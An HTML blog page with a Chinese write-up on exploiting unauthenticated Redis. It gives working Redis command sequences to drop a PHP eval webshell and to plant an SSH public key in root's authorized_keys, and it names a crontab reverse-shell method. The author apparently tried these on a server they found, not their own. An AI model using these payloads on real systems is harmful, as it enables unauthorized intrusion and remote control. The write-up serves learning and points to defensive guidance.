@@ -1,0 +1,544 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Redis未授权访问实战 - Yueyejian’s Blog</title>
+<meta name="description" content="Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="Redis未授权访问实战">
+<meta property="og:url" content="http://localhost:4000/vul/Redis/">
+
+
+  <meta property="og:description" content="Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-04-13T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/vul/Redis/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere in China.</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Redis未授权访问实战">
+    <meta itemprop="description" content="Redis未授权访问实战0x00 前言最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。">
+    <meta itemprop="datePublished" content="2022-04-13T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Redis未授权访问实战
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-04-13T00:00:00+08:00">April 13, 2022</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#redis未授权访问实战">Redis未授权访问实战</a><ul><li><a href="#0x00-前言">0x00 前言</a></li><li><a href="#0x01-redis简介">0x01 Redis简介</a></li><li><a href="#0x02-漏洞原理产生条件">0x02 漏洞原理（产生条件）</a></li><li><a href="#0x03-漏洞利用">0x03 漏洞利用</a><ul><li><a href="#方法1-利用redis写webshell条件是知道web目录的绝对路径并有读写权限">方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限）</a></li><li><a href="#方法2-在目标机器写入ssh公钥-然后在用私钥登录前提是开启了ssh服务即22号端口开放目标机器root权限启动redis">方法2 在目标机器写入ssh公钥 然后在用私钥登录（前提是开启了ssh服务即22号端口开放，目标机器root权限启动redis）</a></li><li><a href="#方法3-修改目标机器的crontab-添加弹shell命令">方法3 修改目标机器的crontab 添加弹shell命令</a></li></ul></li><li><a href="#0x04-小结">0x04 小结</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="redis未授权访问实战">Redis未授权访问实战</h1>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。</p>
+
+<h2 id="0x01-redis简介">0x01 Redis简介</h2>
+<p>简单来说，Redis是一种数据库。
+Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+
+<p>Redis和mysql的区别：
+https://www.hzpady.com/a/2119.html</p>
+
+<h2 id="0x02-漏洞原理产生条件">0x02 漏洞原理（产生条件）</h2>
+<p>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
+没有设置密码认证，可以免密码登入redis服务。</p>
+
+<h2 id="0x03-漏洞利用">0x03 漏洞利用</h2>
+<h3 id="方法1-利用redis写webshell条件是知道web目录的绝对路径并有读写权限">方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限）</h3>
+
+<p>先下载个Redis</p>
+
+<p><img src="/images/vul/redis/0.jpg" alt="" /></p>
+
+<p>在redis官网上看到可以docker pull，那岂不乐哉。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker search redis
+$ docker pull redis
+</code></pre></div></div>
+
+<p>只需两条命令，redis已成为我的囊中之物</p>
+
+<p><img src="/images/vul/redis/1.jpg" alt="" /></p>
+
+<p>接下来运行容器</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -d -p 6379:6379 --name redis redis
+</code></pre></div></div>
+<p>用ps命令可以看到redis已经部署到了我的6379端口了</p>
+
+<p><img src="/images/vul/redis/2.jpg" alt="" /></p>
+
+<p>刚刚学了Redis未授权访问漏洞，那我自己不会也可以被x了吧？于是我扫了一下自己，并没有发现6379端口开放，那我应该还是安全的。而且好像如果被x了，x的应该也是我的docker容器才对！</p>
+
+<p><img src="/images/vul/redis/3.jpg" alt="" /></p>
+
+<p>下一步进入容器</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec -it redis /bin/bash
+</code></pre></div></div>
+<p>在容器里用 <code class="language-plaintext highlighter-rouge">redis-cli -h xxx.xxx.xxx.xxx </code>命令来连接存在漏洞的服务器</p>
+
+<p><img src="/images/vul/redis/4.jpg" alt="" /></p>
+
+<p>连接成功后的一些常用命令：</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">查看信息：info</span>
+<span class="s">删除所有数据库内容：flushall</span>
+<span class="s">刷新数据库：flushdb</span>
+<span class="s">查看所有键：KEYS *，使用select num可以查看键值数据</span>
+<span class="s">设置变量：set test "whoami"</span>
+<span class="s">设置路径等配置：config set dir [dirpath]</span>
+<span class="s">获取路径及数据配置信息：config get dir/dbfilename</span>
+<span class="s">获取所有配置信息：config get *</span>
+<span class="s">保存：save</span>
+<span class="s">查看变量名称：get [变量]</span>
+</code></pre></div></div>
+
+<p>开始写webshell了，方法是</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span> 
+<span class="n">config</span> <span class="k">set</span>  <span class="n">dbfilename</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span> 
+<span class="k">set</span> <span class="n">x</span> <span class="nv">"&lt;?php eval($_POST[cmd]);?&gt;"</span> 
+<span class="n">save</span>
+</code></pre></div></div>
+
+<p><strong>发现找不到网站的绝对路径</strong>，试了很多也没用，看来只能另辟蹊径了</p>
+
+<h3 id="方法2-在目标机器写入ssh公钥-然后在用私钥登录前提是开启了ssh服务即22号端口开放目标机器root权限启动redis">方法2 在目标机器写入ssh公钥 然后在用私钥登录（前提是开启了ssh服务即22号端口开放，目标机器root权限启动redis）</h3>
+
+<p><img src="/images/vul/redis/5.jpg" alt="" /></p>
+
+<p><img src="/images/vul/redis/6.jpg" alt="" /></p>
+
+<p>再把key.txt导入容器</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker cp ./key.txt redis:/home
+</code></pre></div></div>
+
+<p>进入容器，如图操作发现没有权限，很遗憾，但是说明此方法也不可行了。</p>
+
+<p><img src="/images/vul/redis/7.jpg" alt="" /></p>
+
+<p>如果有权限的话就可以</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span>
+     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">get</span> <span class="n">dir</span>
+     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="nv">"authorized_keys"</span>
+     <span class="o">&gt;</span> <span class="n">save</span>
+
+<span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">a</span> <span class="n">root</span><span class="o">@</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>     
+</code></pre></div></div>
+
+<p>或者如下</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span>
+      <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="n">authorized_keys</span>
+      <span class="o">&gt;</span> <span class="k">set</span> <span class="n">x</span> <span class="nv">"</span><span class="se">\n\n\n</span><span class="nv">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC87XDbro8GLpOd4CLvm4uEkyeHAg5qElanEaiYIVh19fo6DvEYHjvUJ6+xg86wXSqbO9YPBvW+ZBFEDwq2ywVOL0jxrQ26GdQwY4SSfvrKdPKUVLvoV5+haZ6wc9ECK0P5rVuVuljWYTh+T5TCubEdXa5QKWNf+lGqDED6unUg4RuvI+1+LAWPrSTMGuYazHYC5GMVp/Y/eA9jrbEH3BZyYLLdsYB4yBw3Ej6hezpFjIJsOJaTx9PlO2rce7VJjCZkCRu5eqLkSqyEFEyD2UNVPQ21oIzaVg4rShMij1r6R8CMpc6mysbOEcEsCBLNZxN3EfwGOwtSYa8LV3d0mHXn ubuntu@VM-20-16-ubuntu</span><span class="se">\n\n\n</span><span class="nv">"</span>
+      <span class="o">&gt;</span> <span class="n">save</span>
+</code></pre></div></div>
+
+<h3 id="方法3-修改目标机器的crontab-添加弹shell命令">方法3 修改目标机器的crontab 添加弹shell命令</h3>
+
+<ul>
+  <li><a href="/linux-tricks/crontab/">Linux - Crontab</a></li>
+</ul>
+
+<p>很可惜在目标机器中没有找到 /var/spool/cron 文件夹</p>
+
+<p>如果写到/etc/crontab文件中能否利用成功呢？到处都是知识盲区，还是得自己搭环境慢慢试。</p>
+
+<h2 id="0x04-小结">0x04 小结</h2>
+<p>我感觉这个漏洞算是挺常见的，经常能在其他文章中看到，今天自己也挖到了，于是就简单学习了一波。这算是很古老的漏洞了吧，但是在今天仍然随处可见，正说明了人类的不良习惯造成的漏洞是没办法打补丁的。</p>
+
+<p>参考文章（里面防护方法也很详细）
+https://www.freebuf.com/articles/network/170904.html</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      <a href="/tags/#redis" class="page__taxonomy-item" rel="tag">redis</a><span class="sep">, </span>
+    
+      <a href="/tags/#ssh" class="page__taxonomy-item" rel="tag">ssh</a><span class="sep">, </span>
+    
+      <a href="/tags/#unauthorized" class="page__taxonomy-item" rel="tag">unauthorized</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#vul" class="page__taxonomy-item" rel="tag">vul</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-04-13T00:00:00+08:00">April 13, 2022</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/tricks/lfi-files/" class="pagination--pager" title="LFI - 可利用敏感文件
+">Previous</a>
+    
+    
+      <a href="/vulhub/CVE-2016-4437/" class="pagination--pager" title="CVE-2016-4437 - Shiro反序列化
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
